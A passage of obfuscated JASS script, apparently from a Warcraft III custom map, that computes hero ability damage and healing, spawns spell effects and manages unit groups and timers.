call kM(NQ,NR,"+"+I2S(R2I(No)*3),.022,255,100,100,-10)
set Np=I2R(GetHeroStr(NR,true)/3*GetUnitAbilityLevel(NR,$41313651))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+Np)
call kM(NR,NR,"|c00ff0000Multicast x3!|r "+"|c0000ff00+"+I2S(R2I(Np)),.022,255,255,255,10)
elseif GetRandomInt(1,100)<=GetUnitAbilityLevel(NR,$41313651)*9 then
set Mc=750+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/7)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No)*2)
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)*2),.022,255,100,100,-10)
set Np=I2R(GetHeroStr(NR,true)/3*GetUnitAbilityLevel(NR,$41313651))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+Np)
call kM(NR,NR,"|c00ff0000Multicast x2!|r "+"|c0000ff00+"+I2S(R2I(Np)),.022,255,255,255,10)
else
set Mc=750+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/7)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)),.022,255,100,100,-10)
endif
else
set Mc=750+R2I(GetUnitState(NR,UNIT_STATE_MAX_LIFE)/7)
set No=I2R(Mc)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(No))
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)-GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.022)
call kM(NQ,NR,"+"+I2S(R2I(No)),.022,255,100,100,-10)
endif
endif
endfunction
function ke takes unit NR,unit NQ returns nothing
local integer Nj=(100+GetHeroAgi(NR,true)/7)*GetUnitAbilityLevel(NR,$41305947)
local real NS=I2R(Nj)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(NS))
endfunction
function kf takes nothing returns nothing
call DestroyLightning(LoadLightningHandle(Nn,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nn,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function kg takes location Ht,location Nk,string Nl returns nothing
local lightning Nm=AddLightning(Nl,true,GetLocationX(Ht),GetLocationY(Ht),GetLocationX(Nk),GetLocationY(Nk))
local timer Hc=CreateTimer()
call SaveLightningHandle(Nn,GetHandleId(Hc),1,Nm)
call TimerStart(Hc,.5,false,function kf)
set Hc=null
set Nm=null
endfunction
function kh takes nothing returns nothing
local unit Hu=GetEnumUnit()
local location Ht=GetUnitLoc(Nh)
local location Nk=GetUnitLoc(Hu)
local integer Nj
local real NS
local string M6=""
if GetOwningPlayer(Nh)==GetLocalPlayer() then
set M6="Abilities\\Spells\\Other\\Drain\\DrainCaster.mdl"
endif
call DestroyEffect(AddSpecialEffectTarget(M6,Hu,"overhead"))
if GetUnitAbilityLevel(Nh,$41305939)>=1 then
set Nj=(70+GetHeroAgi(Nh,true)/5)*GetUnitAbilityLevel(Nh,$41305939)
set NS=I2R(Nj)*Nd[GetPlayerId(GetOwningPlayer(Nh))+1]
call kQ(Nh,Hu,R2I(NS))
elseif GetUnitAbilityLevel(Nh,$41305958)>=1 then
set Nj=700+GetHeroAgi(Nh,true)*7/2
set NS=I2R(Nj)*Nd[GetPlayerId(GetOwningPlayer(Nh))+1]
call kQ(Nh,Hu,R2I(NS))
endif
call kg(Ht,Nk,"GRNL")
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
endfunction
function ki takes unit NR,unit NQ returns nothing
local location Ht=GetUnitLoc(NQ)
local group Na=CreateGroup()
local boolexpr Nb=Condition(function kW)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),400,Nb)
set Nh=NR
call ForGroup(Na,function kh)
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
endfunction
function kj takes unit NR,unit NQ returns nothing
local integer Nj
local real NS
if GetUnitAbilityLevel(NR,$41313631)>=1 then
set Nj=(200+GetHeroStr(NR,true)/2)*GetUnitAbilityLevel(NR,$41305350)
set NS=I2R(Nj)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kP(NR,NQ,R2I(NS))
elseif GetUnitAbilityLevel(NR,$41313638)>=1 then
set Nj=800+GetHeroStr(NR,true)*2
set NS=I2R(Nj)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
call kP(NR,NQ,R2I(NS))
endif
endfunction
function kk takes unit NR,unit NQ returns nothing
local integer Nj
local real NS
local location Mc
local group No
local boolexpr Np
local string Nt
set Ns[GetPlayerId(GetOwningPlayer(NR))]=Ns[GetPlayerId(GetOwningPlayer(NR))]+1
if GetUnitAbilityLevel(NR,$41303833)>=1 then
set Nj=(200+GetHeroAgi(NR,true)/3)*GetUnitAbilityLevel(NR,$41303833)
set NS=I2R(Nj)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
if GetUnitAbilityLevel(NR,$42303856)>=1 then
set NS=NS*2
endif
if Ns[GetPlayerId(GetOwningPlayer(NR))]>=3 then
set Ns[GetPlayerId(GetOwningPlayer(NR))]=0
set NS=NS*2
set Mc=GetUnitLoc(NQ)
set No=CreateGroup()
set Np=Condition(function kW)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),400,Np)
set Nt=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
set Nt="war3mapImported\\Energy Release.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(Nt,Mc))
set Nh=NR
set Nu=R2I(NS)
call ForGroup(No,function kS)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set No=null
else
call kQ(NR,NQ,R2I(NS))
endif
elseif GetUnitAbilityLevel(NR,$41303834)>=1 then
set Nj=1000+GetHeroAgi(NR,true)*3
set NS=I2R(Nj)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
if GetUnitAbilityLevel(NR,$42303856)>=1 then
set NS=NS*2
endif
if Ns[GetPlayerId(GetOwningPlayer(NR))]>=3 then
set Ns[GetPlayerId(GetOwningPlayer(NR))]=0
set NS=NS*2
set Mc=GetUnitLoc(NQ)
set No=CreateGroup()
set Np=Condition(function kW)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),400,Np)
set Nt=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
set Nt="war3mapImported\\Energy Release.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(Nt,Mc))
set Nh=NR
set Nu=R2I(NS)
call ForGroup(No,function kS)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set No=null
else
call kQ(NR,NQ,R2I(NS))
endif
endif
endfunction
function kl takes nothing returns nothing
local unit Hu=GetEnumUnit()
local string Mc
if GetUnitAbilityLevel(Hu,$42303042)<=0 then
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="Abilities\\Spells\\Human\\HolyBolt\\HolyBoltSpecialArt.mdl"
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,Hu,"origin"))
call SetUnitState(Hu,UNIT_STATE_LIFE,GetUnitState(Hu,UNIT_STATE_LIFE)+I2R(Nu))
endif
set Hu=null
endfunction
function km takes unit NR,unit NQ returns nothing
local integer NS=R2I(I2R(GetHeroStr(NR,true)*2*GetUnitAbilityLevel(NR,$41305550))*Ng[GetPlayerId(GetOwningPlayer(NR))+1])
local string M6=""
local location Ht
local group Na
local boolexpr Nb
call kP(NR,NQ,NS)
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="Abilities\\Spells\\Human\\HolyBolt\\HolyBoltSpecialArt.mdl"
endif
call DestroyEffect(AddSpecialEffectTarget(M6,NQ,"origin"))
set Ht=GetUnitLoc(NQ)
set Na=CreateGroup()
set Nb=Condition(function kV)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),400,Nb)
set Nu=R2I(I2R(GetHeroInt(NR,true))*Nf[GetPlayerId(GetOwningPlayer(NR))+1])
call ForGroup(Na,function kl)
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
endfunction
function kn takes unit NR,unit NQ returns nothing
local real NS
if GetUnitAbilityLevel(NR,$42303042)<=0 then
if N5==11 then
set NS=I2R(450+GetHeroStr(NR,true)/4)*Nf[GetPlayerId(GetOwningPlayer(NR))+1]
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+NS)
elseif N5<=10 then
set NS=I2R(30*N5+GetHeroStr(NR,true)/5)*Nf[GetPlayerId(GetOwningPlayer(NR))+1]
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+NS)
endif
endif
endfunction
function ko takes unit NR,unit NQ returns nothing
local real NS
if GetUnitAbilityLevel(NR,$41305037)>=1 then
set NS=I2R(50*GetUnitAbilityLevel(NR,$41305037)+GetHeroAgi(NR,true))*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
else
set NS=I2R(500+GetHeroAgi(NR,true)*3/2)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
endif
call kQ(NR,NQ,R2I(NS))
endfunction
function kp takes unit NR,unit NQ returns nothing
local real NS
local location Ht=GetUnitLoc(NQ)
local unit Hu=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call UnitAddAbility(Hu,$41304546)
call kO(Hu,1)
if GetUnitAbilityLevel(NQ,$42303543)>=1 then
set NS=I2R((GetHeroAgi(NR,true)+150)*GetUnitAbilityLevel(NR,$41305047))*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
set NS=NS*3/2
call UnitRemoveAbility(NQ,$42303543)
call kM(NQ,NR,"Damage!",.023,255,0,0,1)
else
call IssueTargetOrder(Hu,"cripple",NQ)
set NS=I2R((GetHeroAgi(NR,true)+150)*GetUnitAbilityLevel(NR,$41305047))*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
call kM(NQ,NR,"Debuff!",.023,255,0,255,1)
endif
call kQ(NR,NQ,R2I(NS))
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function kq takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NS
local location Mc
local unit No
if Nw[Ma]==NQ then
set Nx[Ma]=Nx[Ma]+1
set NS=I2R(50*GetUnitAbilityLevel(NR,$41313347)*Nx[Ma]+GetHeroAgi(NR,true)/10*Nx[Ma])*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
call kQ(NR,NQ,R2I(NS))
if Nx[Ma]>=5 then
set Nx[Ma]=0
set Mc=GetUnitLoc(NQ)
set No=CreateUnitAtLoc(GetOwningPlayer(NR),$6E303651,Mc,0)
call kO(No,4)
call RemoveLocation(Mc)
set Mc=null
set No=null
if GetUnitAbilityLevel(NR,$41303853)>=1 then
set Mc=GetUnitLoc(NR)
set No=CreateUnitAtLoc(GetOwningPlayer(NR),$6E303651,Mc,0)
call kO(No,4)
call RemoveLocation(Mc)
set Mc=null
set No=null
endif
endif
else
set Nw[Ma]=NQ
set Nx[Ma]=0
endif
endfunction
function kr takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call UnitRemoveAbility(Hu,$41313838)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41313839,true)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function ks takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NS
local location Mc
local group No
local boolexpr Np
local string Nt
local timer Ny
set Nx[Ma+10]=Nx[Ma+10]+1
if Nx[Ma+10]==7 then
set Nx[Ma+10]=0
set NS=I2R(150*GetUnitAbilityLevel(NR,$41313839)+GetHeroAgi(NR,true)*8)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
set Mc=GetUnitLoc(NQ)
set No=CreateGroup()
set Np=Condition(function kW)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),400,Np)
set Nt=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
set Nt="war3mapImported\\Blink Blue Caster.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(Nt,Mc))
set Nh=NR
set Nu=R2I(NS)
call ForGroup(No,function kS)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Mc)
set Mc=null
set Np=null
set No=null
call SetPlayerAbilityAvailable(GetOwningPlayer(NR),$41313839,false)
call UnitAddAbility(NR,$41313838)
set Ny=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Ny),0,NR)
call TimerStart(Ny,2.5,false,function kr)
set Ny=null
endif
endfunction
function kt takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$4130574D)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function ku takes nothing returns nothing
local unit NR=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local real Mc
local location No
local group Np
local boolexpr Nt
local string Ny
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>0 then
set Mc=I2R(70*GetUnitAbilityLevel(NR,$4130574C)+GetHeroAgi(NR,true)*2)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
set No=GetUnitLoc(NQ)
set Np=CreateGroup()
set Nt=Condition(function kW)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),200,Nt)
set Ny=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
set Ny="Abilities\\Weapons\\Bolt\\BoltImpact.mdl"
endif
call DestroyEffect(AddSpecialEffectTarget(Ny,NQ,"overhead"))
call DestroyEffect(AddSpecialEffectLoc("Abilities\\Spells\\Human\\Thunderclap\\ThunderClapCaster.mdl",No))
set Nh=NR
set Nu=R2I(Mc)
call ForGroup(Np,function kS)
call DestroyBoolExpr(Nt)
call DestroyGroup(Np)
call RemoveLocation(No)
set No=null
set Nt=null
set Np=null
else
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set NR=null
set NQ=null
endfunction
function kv takes unit NR,unit NQ returns nothing
local timer Hc
call UnitAddAbility(NQ,$4130574D)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NQ)
call TimerStart(Hc,6,false,function kt)
set Hc=null
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,NR)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,NQ)
call SaveInteger(Nq,GetHandleId(Hc),2,4)
call TimerStart(Hc,1,true,function ku)
set Hc=null
endfunction
function kw takes nothing returns nothing
local unit Nv=GetEnumUnit()
if GetUnitAbilityLevel(Nv,$42303851)>=1 then
call kR(Nh,Nv,Nu*2)
set Nv=null
else
call kR(Nh,Nv,Nu)
set Nv=null
endif
set Nv=null
endfunction
function kx takes unit NR,unit NQ returns nothing
local real NS=I2R(GetHeroInt(NR,true))+GetUnitState(NR,UNIT_STATE_MANA)/10*N0[GetPlayerId(GetOwningPlayer(NR))+1]
local location Ht
local group Na
local boolexpr Nb
local string M6=""
call SetUnitState(NR,UNIT_STATE_MANA,GetUnitState(NR,UNIT_STATE_MANA)-GetUnitState(NR,UNIT_STATE_MAX_MANA)*.03)
set Ht=GetUnitLoc(NQ)
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Grin Curse.mdx",Ht))
set Na=CreateGroup()
set Nb=Condition(function kW)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),200,Nb)
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="war3mapImported\\Culling Slash Purple.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(M6,Ht))
set Nh=NR
set Nu=R2I(NS)
call ForGroup(Na,function kw)
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
endfunction
function ky takes nothing returns nothing
local unit Nv=GetEnumUnit()
if GetUnitAbilityLevel(Nv,$42303157)>=1 then
call kR(Nh,Nv,Nu*2)
set Nv=null
else
call kR(Nh,Nv,Nu)
set Nv=null
endif
set Nv=null
endfunction
function kz takes unit NR,unit NQ returns nothing
local real NS
local location Ht
local string M6=""
local group Na
local boolexpr Nb
if GetUnitAbilityLevel(NR,$41304338)>=1 then
set NS=I2R(GetHeroAgi(NR,true)*2)+GetUnitAbilityLevel(NR,$41304338)*200*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
else
set NS=I2R(GetHeroAgi(NR,true)*3+800)*Nd[GetPlayerId(GetOwningPlayer(NR))+1]
endif
set Ht=GetUnitLoc(NQ)
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="war3mapImported\\AquaSpike.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(M6,Ht))
set Na=CreateGroup()
set Nb=Condition(function kW)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),300,Nb)
set Nh=NR
set Nu=R2I(NS)
call ForGroup(Na,function ky)
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
endfunction
function k0 takes unit NR,unit NQ returns nothing
local real NS=GetUnitState(NR,UNIT_STATE_MANA)*.1*N0[GetPlayerId(GetOwningPlayer(NR))+1]
set Nu=R2I(NS)+GetUnitAbilityLevel(NR,$41304253)*300
call kR(NR,NQ,Nu)
endfunction
function k1 takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41305842)
call SetUnitVertexColor(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),255,255,255,255)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function k2 takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real Mc
local location Ht
local group Na
local boolexpr Nb
local string M6=""
local timer No
if GetUnitAbilityLevel(NR,$41304236)>=1 then
set Mc=I2R(300*GetUnitAbilityLevel(NR,$41304236)+GetHeroStr(NR,true)*2)*Ng[Ma+1]
set Nu=R2I(Mc)+GetHeroStr(NR,true)/7*GetUnitAbilityLevel(NR,$41304B57)
else
set Mc=I2R(2000+GetHeroStr(NR,true)*3)*Ng[Ma+1]
set Nu=R2I(Mc)+GetHeroStr(NR,true)/6*GetUnitAbilityLevel(NR,$41304B57)
endif
set Ht=GetUnitLoc(NQ)
set Na=CreateGroup()
set Nb=Condition(function kW)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),300,Nb)
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="war3mapImported\\Culling Slash II Red.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(M6,Ht))
call DestroyEffect(AddSpecialEffectLoc(M6,Ht))
call DestroyEffect(AddSpecialEffectLoc(M6,Ht))
set Nh=NR
call ForGroup(Na,function kS)
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
if GetUnitAbilityLevel(NR,$41305842)==0 then
set Nz[Ma+10]=Nz[Ma+10]+1
if Nz[Ma+10]>=3 then
set Nz[Ma+10]=0
call UnitAddAbility(NR,$41305842)
call SetPlayerAbilityAvailable(GetOwningPlayer(NR),$41305842,false)
call SetUnitVertexColor(NR,255,0,0,150)
set No=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(No),0,NR)
call TimerStart(No,5,false,function k1)
set No=null
endif
endif
endfunction
function k3 takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NS
if GetUnitAbilityLevel(NR,$41313436)==0 then
set NS=I2R(250*GetUnitAbilityLevel(NR,$41314152)+GetHeroStr(NR,true)/2)*Ng[Ma+1]
if GetUnitAbilityLevel(NR,$4130584B)>=1 then
call UnitDamageTarget(NR,NQ,NS+NS/5,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
else
call UnitDamageTarget(NR,NQ,NS,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
endif
else
set NS=I2R(150*GetUnitAbilityLevel(NR,$41314152)+GetHeroStr(NR,true)/3)*Nf[Ma+1]
call SetUnitState(NR,UNIT_STATE_LIFE,GetUnitState(NR,UNIT_STATE_LIFE)+NS)
endif
endfunction
function k4 takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NS
local location Ht
local string Mc
local group No
local boolexpr Np
local unit Nt
set Nh=NR
if GetUnitAbilityLevel(NR,$41313436)==0 then
set NS=I2R(150*GetUnitAbilityLevel(NR,$4131314A)+GetHeroStr(NR,true)*3)*Ng[Ma+1]
if GetUnitAbilityLevel(NR,$4130584B)>=1 then
if GetUnitAbilityLevel(NR,$41313148)>=1 then
set Nu=R2I(NS)*3/2
else
set Nu=R2I(NS)*2
endif
else
set Nu=R2I(NS)
endif
set Ht=GetUnitLoc(NQ)
set Mc=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
if GetUnitTypeId(NR)==$48303738 then
set Mc="war3mapImported\\Ephemeral Slash Red.mdx"
else
set Mc="war3mapImported\\Coup de Grace.mdx"
endif
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,NR,"chest"))
set No=CreateGroup()
set Np=Condition(function kW)
call GroupEnumUnitsInRange(No,GetLocationX(Ht),GetLocationY(Ht),400,Np)
call ForGroup(No,function kS)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Ht)
set Ht=null
set Np=null
set No=null
elseif GetUnitAbilityLevel(NR,$41313436)>=1 then
set NS=I2R(150*GetUnitAbilityLevel(NR,$4131314B)+GetHeroStr(NR,true)*3/2)*Ng[Ma+1]
if GetUnitAbilityLevel(NR,$4130584B)>=1 then
if GetUnitAbilityLevel(NR,$41313148)>=1 then
set Nu=R2I(NS)*3/2
else
set Nu=R2I(NS)*2
endif
else
set Nu=R2I(NS)
endif
call UnitDamageTarget(Nh,NQ,I2R(Nu),true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Ht=GetUnitLoc(NQ)
set Mc=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
if GetUnitTypeId(NR)==$48303738 then
set Mc="war3mapImported\\Ephemeral Slash Purple.mdx"
else
set Mc="war3mapImported\\Coup de Grace Purple.mdx"
endif
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,NR,"chest"))
set Nt=CreateUnitAtLoc(Player(Ma),$68303739,Ht,0)
call UnitAddAbility(Nt,$41313143)
call IssueTargetOrder(Nt,"frostnova",NQ)
call kO(Nt,1)
set Nt=null
endif
set Ht=null
endfunction
function k5 takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NS
local location Ht=GetUnitLoc(NR)
local location Nk=GetUnitLoc(NQ)
if GetUnitAbilityLevel(NR,$41305233)>=1 then
set NS=(I2R(GetHeroAgi(NR,true)*5)+DistanceBetweenPoints(Ht,Nk)*I2R(GetUnitAbilityLevel(NR,$41305233)))*Nd[Ma+1]
call UnitDamageTarget(NR,NQ,NS,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
call kM(NR,NR,"+"+I2S(R2I(NS)),.025,0,255,255,255)
else
set NS=(I2R(GetHeroAgi(NR,true)*7)+DistanceBetweenPoints(Ht,Nk)*5)*Nd[Ma+1]
call UnitDamageTarget(NR,NQ,NS,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
call kM(NR,NR,"+"+I2S(R2I(NS)),.025,0,255,255,255)
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
endfunction
function k6 takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NS
local location Ht=GetUnitLoc(NQ)
local string M6=""
local group Na
local boolexpr Nb
set Nh=NR
if GetUnitAbilityLevel(NR,$41305830)>=1 then
set NS=I2R(400*GetUnitAbilityLevel(NR,$41305830)+GetHeroAgi(NR,true)*3/2)*Nd[Ma+1]
else
set NS=I2R(6500+GetHeroAgi(NR,true)*3)*Nd[Ma+1]
endif
set Nu=R2I(NS)
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="Objects\\Spawnmodels\\Human\\HCancelDeath\\HCancelDeath.mdl"
endif
call DestroyEffect(AddSpecialEffectLoc(M6,Ht))
set Na=CreateGroup()
set Nb=Condition(function kW)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),300,Nb)
call ForGroup(Na,function kS)
call DestroyBoolExpr(Nb)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set Na=null
call RemoveLocation(Ht)
set Ht=null
endfunction
function k7 takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41304C51)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function k8 takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real NS=I2R(GetHeroAgi(NR,true)/5*GetUnitAbilityLevel(NR,$4130304E))*Nd[Ma+1]
local timer Mc
call UnitDamageTarget(NR,NQ,NS,true,false,ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
if GetRandomInt(1,10)==1 and GetUnitAbilityLevel(NQ,$41304C51)==0 then
call kM(NQ,NR,"Умри!",.025,255,100,10,0)
if GetUnitState(NQ,UNIT_STATE_LIFE)>.405 then
call UnitAddAbility(NQ,$41304C51)
call SetUnitAbilityLevel(NQ,$41304C51,GetUnitAbilityLevel(NR,$4130304E))
set Mc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Mc),0,NQ)
call TimerStart(Mc,5,false,function k7)
set Mc=null
endif
endif
endfunction
function k9 takes unit NR,unit NQ returns nothing
local real NS
if GetUnitAbilityLevel(NQ,$41313542)!=11 then
set NS=I2R(70*GetUnitAbilityLevel(NQ,$41313542)+(GetHeroStr(NR,true)+GetHeroAgi(NR,true)+GetHeroInt(NR,true))/10)
call UnitDamageTarget(NR,NQ,NS,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
set NS=I2R(30*GetUnitAbilityLevel(NQ,$41313542))
call SetUnitState(NR,UNIT_STATE_MANA,GetUnitState(NR,UNIT_STATE_MANA)+(NS+GetUnitState(NR,UNIT_STATE_MAX_MANA)/50))
else
set NS=I2R(700+(GetHeroStr(NR,true)+GetHeroAgi(NR,true)+GetHeroInt(NR,true))/7)
call UnitDamageTarget(NR,NQ,NS,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
call SetUnitState(NR,UNIT_STATE_MANA,GetUnitState(NR,UNIT_STATE_MANA)+(400+GetUnitState(NR,UNIT_STATE_MAX_MANA)/50))
endif
endfunction
function lB takes unit NR,unit NQ returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(NR))
local real Mc
local location No
local string Np
local group Nt
local boolexpr Ny
if GetUnitState(NR,UNIT_STATE_MANA)>=GetUnitState(NR,UNIT_STATE_MAX_MANA)/20 then
set Nz[Ma]=Nz[Ma]+1
if Nz[Ma]==5 then
set Nz[Ma]=0
set Mc=GetUnitState(NR,UNIT_STATE_MAX_LIFE)*.05*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
set Nu=R2I(Mc)+GetUnitAbilityLevel(NR,$41304653)*150
set Nh=NR
set No=GetUnitLoc(NR)
set Np=""
if GetOwningPlayer(NR)==GetLocalPlayer() then
set Np="war3mapImported\\Flamestrike Starfire II.mdx"
endif
call DestroyEffect(AddSpecialEffectTarget(Np,NR,"origin"))
set Nt=CreateGroup()
